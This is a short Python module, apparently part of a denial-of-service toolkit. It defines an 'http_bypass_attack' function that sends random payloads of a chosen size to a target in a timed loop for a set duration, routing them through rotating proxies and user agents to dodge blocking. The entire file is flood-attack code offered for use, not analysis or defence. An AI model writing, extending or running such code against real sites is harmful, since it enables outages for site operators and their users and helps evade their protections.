import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_string

def http_bypass_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
    bot = HTTPBot(proxies, user_agents)
    end_time = time.time() + duration
    while time.time() < end_time:
        start_time = time.time()
        payload = random_string(packet_size * 1024)  
        bot.send_request(target, payload)
        elapsed_time = time.time() - start_time  
        remaining_delay = max(0, (packet_delay / 1000) - elapsed_time)  
        time.sleep(remaining_delay)  
